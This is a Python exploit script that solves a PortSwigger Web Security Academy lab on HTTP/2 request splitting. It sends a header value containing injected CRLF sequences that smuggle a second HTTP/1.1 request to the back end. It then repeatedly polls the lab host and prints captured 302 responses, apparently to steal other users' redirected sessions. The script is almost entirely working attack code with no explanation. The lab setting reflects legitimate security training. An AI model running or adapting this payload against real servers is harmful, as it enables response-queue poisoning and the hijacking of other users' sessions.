# https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-splitting-via-crlf-injection
import socket
import ssl

import h2.connection
import h2.events

import time

from random import randrange
SERVER_NAME = '0ac6001a038d6e3280a1e40e00be00be.web-security-academy.net'
SERVER_PORT = 443

# If no 302 response for a long time, reset connection by sending that request 10 times:
# GET /qq HTTP/2
# Host: 0ac6001a038d6e3280a1e40e00be00be.web-security-academy.net

try:
    while True:
        socket.setdefaulttimeout(15)
        ctx = ssl._create_unverified_context()
        ctx.set_alpn_protocols(['h2'])

        s = socket.create_connection((SERVER_NAME, SERVER_PORT))
        s = ctx.wrap_socket(s, server_hostname=SERVER_NAME)

        c = h2.connection.H2Connection()
        c.initiate_connection()
        s.sendall(c.data_to_send())

        headers = [
            (':method', 'GET'),
            (':path', '/x'),
            (':authority', SERVER_NAME),
            (':scheme', 'https'),
            # CRLF Injection
            ('foo', f'bar\r\n\r\nGET /x HTTP/1.1\r\nHost: {SERVER_NAME}'),
        ]

        c.send_headers(1, headers, end_stream=True)
        s.sendall(c.data_to_send())

        raw_response = {
            'headers': [],
            'body': b''
        }

        response_stream_ended = False
        while not response_stream_ended:
            # read raw data from the socket
            data = s.recv(65536 * 1024)
            if not data:
                break

            # feed raw data into h2, and process resulting events
            events = c.receive_data(data)
            for event in events:
                if isinstance(event, h2.events.ResponseReceived):
                    raw_response['headers'] = event.headers
                if isinstance(event, h2.events.DataReceived):
                    # update flow control so the server doesn't starve us
                    c.acknowledge_received_data(event.flow_controlled_length, event.stream_id)
                    # more response body data received
                    raw_response['body'] += event.data
                if isinstance(event, h2.events.StreamEnded):
                    # response body completed, let's exit the loop
                    response_stream_ended = True
                    break
            # send any pending data to the server
            s.sendall(c.data_to_send())

        # tell the server we are closing the h2 connection
        c.close_connection()
        s.sendall(c.data_to_send())

        # close the socket
        s.close()

        print(raw_response['headers'])
        if raw_response['headers'][0][1] == b'302':
            print(raw_response['body'])
        wait = randrange(1,10)
        time.sleep(wait)

except KeyboardInterrupt:
    print('kthxbye')
